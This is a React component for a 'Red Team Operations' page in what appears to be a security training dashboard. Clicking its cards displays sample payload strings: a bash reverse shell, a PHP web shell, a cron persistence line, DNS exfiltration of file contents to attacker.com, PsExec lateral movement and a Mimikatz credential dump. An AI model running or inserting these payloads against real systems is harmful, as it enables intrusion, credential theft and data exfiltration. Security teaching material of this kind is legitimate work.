import { CommandHeader } from "@/components/CommandHeader";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { useNavigate } from "react-router-dom";
import { Terminal, Target, Users, Activity, Globe, Lock, Zap, ArrowLeft, Download, Key, Shield } from "lucide-react";

const RedTeamModule = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [selectedPayload, setSelectedPayload] = useState<string | null>(null);

  const payloadTypes = [
    { name: "Reverse Shell", icon: Terminal, description: "Netcat, Bash, PowerShell", category: "shells" },
    { name: "Web Shells", icon: Globe, description: "PHP, ASP, JSP shells", category: "webshells" },
    { name: "Privilege Escalation", icon: Lock, description: "Linux & Windows exploits", category: "privesc" },
    { name: "Persistence", icon: Activity, description: "Registry, Cron, Services", category: "persistence" },
    { name: "Lateral Movement", icon: Users, description: "PsExec, WMI, RDP", category: "lateral" },
    { name: "Data Exfiltration", icon: Download, description: "DNS, ICMP, HTTPS", category: "exfil" },
    { name: "Credential Dumping", icon: Key, description: "Mimikatz, SAM, LSASS", category: "creds" },
    { name: "Obfuscation", icon: Shield, description: "Encoding, Encryption", category: "obfuscation" },
  ];

  return (
    <div className="min-h-screen bg-background">
      <CommandHeader />
      
      <main className="container mx-auto px-6 py-8">
        <Button variant="ghost" onClick={() => navigate("/")} className="mb-6 gap-2">
          <ArrowLeft className="h-4 w-4" />
          Back to Dashboard
        </Button>

        <div className="mb-8">
          <div className="flex items-center gap-3 mb-2">
            <Target className="h-8 w-8 text-cyber-red" />
            <h1 className="text-3xl font-bold font-mono">Red Team Operations</h1>
          </div>
          <p className="text-muted-foreground">Advanced offensive security tools and techniques</p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
          {payloadTypes.map((type) => (
            <Card 
              key={type.name} 
              className="p-6 hover:border-cyber-red/50 transition-colors cursor-pointer bg-card/50 backdrop-blur-sm"
              onClick={() => {
                toast({ title: `${type.name} Payload`, description: `Loading ${type.description}...` });
                setSelectedPayload(type.category);
              }}
            >
              <type.icon className="h-8 w-8 text-cyber-red mb-3" />
              <h3 className="font-semibold mb-2 font-mono">{type.name}</h3>
              <p className="text-sm text-muted-foreground">{type.description}</p>
            </Card>
          ))}
        </div>

        <Card className="p-6 bg-card/50 backdrop-blur-sm">
          <div className="flex items-center gap-2 mb-4">
            <Target className="h-5 w-5 text-cyber-purple" />
            <h2 className="text-xl font-semibold font-mono">{selectedPayload ? "Payload Examples" : "TTP Database"}</h2>
          </div>
          {!selectedPayload ? (
            <>
              <p className="text-sm text-muted-foreground mb-4">MITRE ATT&CK framework tactics</p>
              <div className="space-y-2 mb-4">
                {["Initial Access", "Execution", "Persistence", "Lateral Movement"].map((tactic, idx) => (
                  <div key={tactic} className="flex justify-between items-center">
                    <span className="text-sm font-mono">{tactic}</span>
                    <Badge>{12 + idx} techniques</Badge>
                  </div>
                ))}
              </div>
              <Button className="w-full bg-cyber-purple hover:bg-cyber-purple/80 text-background" onClick={() => toast({ title: "TTP Database", description: "Opening MITRE ATT&CK..." })}>
                <Zap className="mr-2 h-4 w-4" />Browse Full Database
              </Button>
            </>
          ) : (
            <div className="space-y-4">
              <Button variant="ghost" size="sm" onClick={() => setSelectedPayload(null)}>← Back</Button>
              <Card className="p-4 bg-background/50">
                <code className="text-xs font-mono text-cyber-green whitespace-pre-wrap block">
                  {selectedPayload === "shells" && `# Reverse Shells\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\npython -c 'import socket...'`}
                  {selectedPayload === "webshells" && `<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>`}
                  {selectedPayload === "privesc" && `# Linux PrivEsc\nsudo -l\nfind / -perm -u=s -type f 2>/dev/null`}
                  {selectedPayload === "persistence" && `# Cron Job\necho "* * * * * /tmp/shell.sh" | crontab -`}
                  {selectedPayload === "lateral" && `# PsExec\npsexec.py domain/user:pass@192.168.1.10 cmd`}
                  {selectedPayload === "exfil" && `# DNS Exfil\nfor i in $(cat data.txt); do dig $i.attacker.com; done`}
                  {selectedPayload === "creds" && `# Mimikatz\nmimikatz.exe "sekurlsa::logonpasswords"`}
                  {selectedPayload === "obfuscation" && `# Base64\necho 'cmd' | base64`}
                </code>
              </Card>
            </div>
          )}
        </Card>
      </main>
    </div>
  );
};

export default RedTeamModule;
